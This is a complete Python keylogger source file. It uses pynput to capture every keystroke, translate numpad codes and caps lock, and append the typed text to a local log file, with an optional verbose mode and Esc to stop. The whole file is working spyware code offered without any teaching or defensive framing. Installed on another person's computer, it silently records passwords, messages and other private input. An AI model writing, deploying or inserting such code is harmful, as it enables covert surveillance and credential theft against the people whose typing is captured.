from pynput.keyboard import Key, Listener
from argparse import ArgumentParser
from time import time


show_detail = False
log_file = None
caps_lock = False
numbers = {
    '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
    '<104>': '8', '<105>': '9'
}


def on_press(key):
    global show_detail
    global caps_lock
    key = str(key).replace("'", "")

    if key == "Key.caps_lock":
        caps_lock = True if caps_lock == False else False

    # convert number into a digital format. p.e: <97> into 1
    try:
        if key.find('>') > 0:
            key = numbers[key]
    except KeyError:
        key = "[Error]"

    save(key)

    if show_detail == True:
        print(f"'{key}' pressed")


def on_release(key):
    if key == Key.esc:
        return False


# save every pressed key in a log file
def save(key):
    global log_file
    global caps_lock

    with open(log_file, "a") as log:
        if key.find("space") > 0:
            log.write(' ')
        elif key.find("enter") > 0:
            log.write('\n')
        elif key.find("Key") == -1:
            log.write(key) if caps_lock == False else log.write(key.upper())


args_parser = ArgumentParser()
args_parser.add_argument('-v', '--verbose', help="show pressed key.", action="store_true")
args_parser.add_argument('-o', '--output', help="specify the output file.")
args = args_parser.parse_args()

if args.verbose:
    print("start listening...")
    show_detail = True
if args.output:
    log_file = args.output
else:
    log_file = str(int(time())) + '.txt'

# create log file
open(log_file, 'x')

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

if args.verbose:
    print("---------- finish listening ----------")
